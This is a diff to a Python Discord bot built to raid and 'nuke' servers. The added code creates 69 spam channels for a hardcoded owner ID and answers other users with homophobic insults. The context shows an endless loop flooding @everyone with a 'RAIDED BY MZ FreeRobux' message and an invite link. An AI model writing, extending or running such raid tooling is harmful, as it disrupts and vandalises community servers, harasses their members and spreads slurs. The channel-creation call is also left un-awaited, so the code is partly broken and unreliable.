@@ -195,6 +195,15 @@ async def nuke_server_fr(ctx):
 
         await nuke_channel_2(ctx)
 
+        async def create_random_channels(txt2):
+            if str(txt2.author.id) != '762152955382071316':
+                print(str(txt2.author.id), "Tried to nuke channel:", txt2.channel, "by using .nuke")
+                await txt2.send("LOL ONLY <@762152955382071316> can nuke this channel, get lost noob\n**YOU GAY**")
+            else:
+                guild = txt2.message.guild
+                for i in range(69):
+                    guild.create_text_channel(name='raided-bitch')
+
         guild = ctx.message.guild
         newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
 
@@ -211,6 +220,9 @@ async def nuke_server_fr(ctx):
         while True:
             await newchannel.send('**<@everyone> (who is still here lol) RAIDED BY MZ FreeRobux '
                                   'https://discord.gg/uAsCWzkNZd. EZ Noobs**')
+#ban part broken for now
+
+
 
 
 bot.run(TOKEN)
